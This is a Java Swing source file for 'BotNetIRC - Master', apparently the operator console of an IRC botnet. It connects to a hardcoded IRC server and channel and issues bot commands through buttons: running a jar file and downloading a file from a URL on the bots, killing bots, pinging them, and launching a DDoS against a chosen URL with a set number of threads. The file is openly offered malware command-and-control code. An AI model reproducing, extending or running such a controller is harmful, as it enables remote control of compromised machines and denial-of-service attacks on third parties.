package mastergui;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.util.Random;

/**
 * Created by zychp_w10 on 08.05.2017.
 */
public class Gui {
    private static String server = "irc.kubehe.me";
    private static String nick = "masterGui";
    private static String login = "masterGui";
    private static String channel = "#channel";

    private Master masterbot;

    private JPanel mainPanel;
    private JTextField commandTextField1;
    private JButton sendButton;
    private JRadioButton encryptionRadioButton;
    private JTextArea logTextArea1;
    private JPanel logPanel;
    private JPanel buttonPanel;
    private JPanel graphpanel;
    private JScrollPane logScrollPane;
    private JCheckBox cleanchatCheckBox;
    private JButton connectionTestButton;
    private JButton runJarFileButton;
    private JButton downloadFileFromUrlButton;
    private JButton killBotButton;
    private JButton helpButton;
    private JButton ddosButton;

    public Gui() throws Exception {
        setNickAndLogin(getRandomNumber());
        masterbot = new Master(server, nick, login, channel);
        masterbot.connectToIRC();
        logTextArea1.setEditable(false);
        JScrollBar vertical = logScrollPane.getVerticalScrollBar();
        cleanchatCheckBox.setSelected(false);
        Timer timer = new Timer(100, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    String line = masterbot.receiveMessageForMastergui(cleanchatCheckBox.isSelected());
                    if (!(line.isEmpty())) {
                        logTextArea1.append(line + "\n");
                        vertical.setValue(vertical.getMaximum());
                    }
                } catch (Exception exc) {
                }
            }
        });
        timer.start();
        sendButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command;
                command = commandTextField1.getText();
                commandTextField1.setText(command);
                logTextArea1.append(command + "\n");
                vertical.setValue(vertical.getMaximum());
                try {
                    masterbot.sendMessage(command);
                } catch (java.lang.Exception exc) {
                }
            }
        });
        commandTextField1.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                super.keyPressed(e);
                if(e.getKeyCode() == KeyEvent.VK_ENTER)
                    sendButton.doClick();
            }
        });
        connectionTestButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("PING");
            }
        });
        runJarFileButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("RUNJAR");
                RunJarFileGui dialog = new RunJarFileGui();
                dialog.setTitle("Run Jar File");
                dialog.setSize(600, 150);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("RUNJAR " + dialog.getJarfilepath());
            }
        });
        downloadFileFromUrlButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("DOWNLOADFILE");
                DownloadFileFromUrlGui dialog = new DownloadFileFromUrlGui();
                dialog.setTitle("Download File");
                dialog.setSize(600, 200);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("DOWNLOADFILE " + dialog.getFilepath() + " " + dialog.getUrl());
            }
        });
        killBotButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                commandTextField1.setText("DIE");
            }
        });
        helpButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                HelpGui dialog = new HelpGui();
                dialog.setTitle("Help");
                dialog.setSize(600, 200);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
            }
        });
        ddosButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                DdosGui dialog = new DdosGui();
                dialog.setTitle("DDos");
                dialog.setSize(600, 200);
                dialog.setLocationByPlatform(true);
                dialog.setVisible(true);
                commandTextField1.setText("DDOS " + dialog.getUrl() + " " + dialog.getNumOfThreads());
            }
        });
    }

    private static void setNickAndLogin(int randomNumber) {
        String number = Integer.toString(randomNumber);
        System.out.println("BOT_NO:" + number);
        nick = nick.concat(number);
        login = login.concat(number);
    }

    private static int getRandomNumber() {
        Random randomGenerator = new Random();
        return randomGenerator.nextInt(9999);
    }

    public static void main(String[] args) throws Exception {
        JFrame frame = new JFrame("Gui");
        frame.setSize(800, 500);
        frame.setLocationByPlatform(true);
        frame.setTitle("BotNetIRC - Master");
        frame.setContentPane(new Gui().mainPanel);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
     }
}
